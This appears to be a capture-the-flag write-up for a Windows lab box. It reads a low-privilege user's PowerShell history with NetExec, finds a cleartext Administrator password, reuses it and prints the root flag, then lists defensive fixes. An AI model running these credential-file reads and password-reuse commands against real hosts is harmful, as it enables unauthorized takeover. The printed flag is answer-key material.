Slayer: PowerShell history password to Administrator

Authorized lab only. Lab author: Ryan Yager. Solved 2026-08-06.

What you need to know

  • Local Windows accounts and NTLM over SMB and RDP
  • NetExec to prove passwords and run remote commands
  • Where PowerShell stores history (PSReadLine)
  • Why history files matter on shared or handed workstations

Main idea

If a low rights user can read PowerShell history, any net user Administrator … line becomes a ready password for privilege rise.

Story

You get tyler.ramsey after social engineering. The host is a single Windows box. SMB and RDP work. WinRM is filtered. The win is not a potato exploit. It is reading shell history and reusing a password.

Why it works

Someone ran net user administrator "…" in a PowerShell session that wrote to tyler history. Windows stored that line in clear text. The password still worked as local Administrator. 

Client (Kali)
   │  tyler.ramsey:P@ssw0rd!
   ▼
SMB 445 / RDP 3389  →  tyler (low rights)
   │
   │  read ConsoleHost_history.txt
   ▼
Administrator password
   │
   ▼
C$\Users\Administrator\Desktop\root.txt

Step 1: Reach the host and map ports

Why: Confirm VPN and which remote paths you can use.
ping -c 1 10.1.176.119
nmap -Pn -n --top-ports 100 -T4 10.1.176.119

Expect: host up. Ports 135, 445, 3389 open. WinRM filtered.

Step 2: Prove the handed password

Why: A handed password only helps if SMB or RDP still accepts it.
nxc smb 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth
nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth

Expect: host EC2AMAZ-M1LFCNO, auth OK, no admin shares for tyler.

Step 3: Identity snapshot

Why: Know groups and rights before you pick a rise path.
printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth -x 'whoami /all'

Expect: Remote Desktop Users, Users, Performance Log Users. Low privileges. Medium integrity.

Step 4: List user homes

Why: Other profiles mean other secrets or accounts.
printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth -x 'dir C:\Users'

Expect: Administrator, alice.wonderland, Public, tyler.ramsey.

Step 5: Read PowerShell history

Why: Interactive shells leave plain text history under the user profile.
printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth \
  -x 'type C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'

Expect a line like:

net user administrator "ebz0yxy3txh9BDE*yeh"

Step 6: Log on as Administrator

Why: Reuse the password. If it still works, you own the box.
nxc smb 10.1.176.119 -u Administrator -p 'ebz0yxy3txh9BDE*yeh' --local-auth
# expect: (Pwn3d!)

Step 7: Read the root flag

Why: Lab goal. Flag sits on the admin Desktop.
smbclient //10.1.176.119/C$ -U 'Administrator%ebz0yxy3txh9BDE*yeh' \
  -c 'get Users\Administrator\Desktop\root.txt root.txt'
cat root.txt
3835538c50e819f392144ae9ef125496

Impact

  • Full local rise from one handed user
  • Clear admin password recovered from disk
  • Path is file read plus auth only

Fix

  • Do not set Administrator passwords from a low rights interactive shell.
  • Clear or turn off PSReadLine history on shared and VDI images.
  • Use LAPS or equal for local admin secrets. Rotate after use.
  • Watch password change events and readers of ConsoleHost_history.txt.
  • Segment RDP. Use MFA on real bastions.

Extra notes

  • If history is wiped, hunt transcripts, scripts, browser stores, DPAPI.
  • If RDP is closed, map more ports for WinRM or other shells.
  • If the password rotated, move to classic service and task abuse.
  • Ops: ~/htb/slayer/ATTACK_LOG.md, loot, screenshots

Close

Slayer rewards post foothold hygiene. The exploit is reading a file you already own and reusing a password that must not live in shell history.
